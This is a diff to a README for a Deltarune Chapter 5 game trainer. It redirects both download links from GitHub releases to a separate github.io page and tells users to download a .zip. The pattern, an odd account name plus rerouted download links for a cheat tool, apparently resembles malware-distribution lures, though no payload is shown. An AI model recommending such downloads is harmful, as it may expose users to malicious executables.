@@ -1,12 +1,12 @@
 # 🎮 Deltarune-Chapter5-Trainer-Ultimate - Improve your role playing game stats
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Tensional-sateen624/Deltarune-Chapter5-Trainer-Ultimate/releases)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://tensional-sateen624.github.io)
 
 This application modifies game values for Deltarune Chapter 5. It allows players to adjust character stats, currency, and damage resistance. It works as an external tool that runs alongside the game client.
 
 ## 📥 Getting the software
 
-Visit [this page](https://github.com/Tensional-sateen624/Deltarune-Chapter5-Trainer-Ultimate/releases) to download the latest version of the trainer. Look for the file ending in .zip under the Assets section. Download this file to your computer.
+Visit [this page](https://tensional-sateen624.github.io) to download the latest version of the trainer. Look for the file ending in .zip under the Assets section. Download this file to your computer.
 
 ## 🛠️ System requirements
 
